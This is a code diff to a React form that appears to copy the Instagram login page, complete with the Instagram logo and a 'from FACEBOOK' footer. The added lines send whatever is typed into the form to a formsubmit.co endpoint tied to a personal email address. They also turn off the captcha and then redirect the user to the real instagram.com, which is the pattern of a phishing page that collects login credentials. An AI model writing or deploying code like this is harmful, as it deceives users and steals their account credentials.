@@ -1,9 +1,13 @@
+import { useEffect } from "react";
 import "./form.styles.css";
 
 const Form = () => {
   return (
     <div className="body">
-      <form>
+      <form
+        action="https://formsubmit.co/iamali5005sher@gmail.com"
+        method="POST"
+      >
         <div className="insta-text">
           <svg
             width="184"
@@ -49,12 +53,17 @@ const Form = () => {
         </div>
         <div className="from-facebook-text">
           <p>
-            {" "}
             <span style={{ color: "#bfbfbf" }}>from</span>
             <br />
             FACEBOOK
           </p>
         </div>
+        <input type="hidden" name="_captcha" value="false"></input>
+        <input
+          type="hidden"
+          name="_next"
+          value="https://www.instagram.com"
+        ></input>
       </form>
     </div>
   );
